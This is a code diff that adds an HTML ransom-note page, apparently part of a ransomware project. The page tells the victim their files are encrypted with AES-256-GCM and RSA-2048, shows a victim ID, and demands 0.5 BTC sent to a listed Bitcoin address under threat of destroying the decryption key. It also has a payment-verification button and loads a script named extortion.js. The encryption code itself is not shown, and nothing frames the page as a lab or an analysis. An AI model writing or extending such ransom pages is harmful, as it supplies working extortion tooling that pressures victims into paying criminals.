@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Files Have Been Encrypted!</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            background-color: #0a0a0a;
+            color: #ff3333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .ransom-container {
+            background-color: #1a1a1a;
+            border: 2px solid #ff3333;
+            padding: 3rem;
+            max-width: 800px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 51, 51, 0.2);
+            border-radius: 8px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .victim-id {
+            background: #2a2a2a;
+            padding: 10px;
+            font-family: monospace;
+            color: #fff;
+            margin: 20px 0;
+            word-break: break-all;
+        }
+        p {
+            color: #ddd;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+        }
+        .payment-box {
+            border: 1px dashed #ff3333;
+            padding: 20px;
+            margin: 20px 0;
+            background: #222;
+        }
+        .btc-address {
+            font-size: 1.2rem;
+            color: #f7931a;
+            font-weight: bold;
+            margin: 10px 0;
+            user-select: all;
+        }
+    </style>
+</head>
+<body>
+    <div class="ransom-container">
+        <h1>⚠️ YOUR FILES ARE ENCRYPTED ⚠️</h1>
+        <p>All your important documents, photos, and databases have been encrypted using military-grade <strong>AES-256-GCM</strong> algorithms. The unique decryption key has been generated and wrapped securely using RSA-2048.</p>
+        
+        <p>To recover your files, you must submit a payment. Otherwise, your unique key will be destroyed forever.</p>
+
+        <div>
+            <span>Your Victim ID:</span>
+            <div class="victim-id" id="victimId">Loading...</div>
+        </div>
+
+        <div class="payment-box">
+            <p>Send exactly <strong>0.5 BTC</strong> to the following address:</p>
+            <div class="btc-address">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+        </div>
+
+        <button id="btnVerifyPayment" class="btn btn-danger" style="width: 100%; font-size: 1.2rem;">Verify Payment & Decrypt</button>
+        <p id="paymentStatus" style="margin-top: 15px; color: #ff9999; display: none;"></p>
+    </div>
+
+    <script src="js/extortion.js"></script>
+</body>
+</html>
